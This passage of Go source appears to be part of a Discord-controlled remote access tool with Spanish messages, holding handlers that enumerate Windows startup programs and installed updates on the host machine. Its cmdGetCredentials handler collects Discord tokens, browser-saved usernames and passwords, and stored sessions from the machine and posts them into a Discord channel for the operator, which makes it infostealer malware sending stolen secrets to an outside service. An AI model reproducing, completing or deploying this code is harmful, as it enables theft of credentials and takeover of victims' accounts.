		Data: &discordgo.InteractionResponseData{
			Content: "Información del sistema operativo (implementación pendiente)",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func getNetworkDetails() *utils.NetworkInfo {
	return &utils.NetworkInfo{
		PublicIP:    "0.0.0.0",
		LocalIP:     "127.0.0.1",
		DNSServers:  []string{"8.8.8.8"},
		Connections: []string{},
	}
}

func cmdListStartup(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "startup", "get", "caption,command")
		output, err := cmd.Output()
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "❌ Error listando programas de inicio: "+err.Error())
			return
		}
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("🚀 Programas de inicio:\n```\n%s\n```", string(output)))
	} else {
		s.ChannelMessageSend(m.ChannelID, "❌ Comando solo disponible en Windows")
	}
}

func cmdCheckUpdates(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "Get-HotFix | Sort-Object -Property InstalledOn")
		output, err := cmd.Output()
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "❌ Error verificando actualizaciones: "+err.Error())
			return
		}
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("🔄 Últimas actualizaciones instaladas:\n```\n%s\n```", string(output)))
	} else {
		cmd := exec.Command("apt", "list", "--upgradeable")
		output, err := cmd.Output()
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "❌ Error verificando actualizaciones: "+err.Error())
			return
		}
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("🔄 Actualizaciones disponibles:\n```\n%s\n```", string(output)))
	}
}

func cmdGetCredentials(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if m.Author.ID != config.OwnerID {
		s.ChannelMessageSend(m.ChannelID, "❌ No tienes permiso para usar este comando")
		return
	}

	s.ChannelMessageSend(m.ChannelID, "🔍 Buscando credenciales y datos sensibles...")

	data, err := utils.GetAllCredentials()
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Error obteniendo credenciales: "+err.Error())
		return
	}

	if len(data.DiscordTokens) > 0 {
		embed := &discordgo.MessageEmbed{
			Title:  "🎮 Tokens de Discord",
			Color:  0x7289DA,
			Fields: []*discordgo.MessageEmbedField{},
		}

		for i, token := range data.DiscordTokens {
			embed.Fields = append(embed.Fields, &discordgo.MessageEmbedField{
				Name:  fmt.Sprintf("Token #%d", i+1),
				Value: fmt.Sprintf("```%s```", token),
			})
		}

		s.ChannelMessageSendEmbed(m.ChannelID, embed)
		time.Sleep(500 * time.Millisecond)
	}

	if len(data.BrowserData) > 0 {
		pageSize := 5
		totalPages := (len(data.BrowserData) + pageSize - 1) / pageSize

		for i := 0; i < len(data.BrowserData); i += pageSize {
			end := i + pageSize
			if end > len(data.BrowserData) {
				end = len(data.BrowserData)
			}

			embed := &discordgo.MessageEmbed{
				Title:  fmt.Sprintf("🌐 Credenciales (Página %d/%d)", (i/pageSize)+1, totalPages),
				Color:  0xFF0000,
				Fields: []*discordgo.MessageEmbedField{},
			}

			for _, cred := range data.BrowserData[i:end] {
				embed.Fields = append(embed.Fields, &discordgo.MessageEmbedField{
					Name: fmt.Sprintf("%s - %s", cred.Browser, cred.URL),
					Value: fmt.Sprintf("👤 Usuario: `%s`\n🔑 Contraseña: `%s`",
						cred.Username, cred.Password),
					Inline: false,
				})
			}

			s.ChannelMessageSendEmbed(m.ChannelID, embed)
			time.Sleep(1 * time.Second)
		}
	}

	if len(data.StoredSessions) > 0 {
		embed := &discordgo.MessageEmbed{
			Title:       "📝 Sesiones Guardadas",
			Color:       0x00FF00,
			Description: fmt.Sprintf("```%s```", strings.Join(data.StoredSessions, "\n")),
		}
		s.ChannelMessageSendEmbed(m.ChannelID, embed)
	}

	s.ChannelMessageSend(m.ChannelID, "✅ Búsqueda de credenciales completada")
}
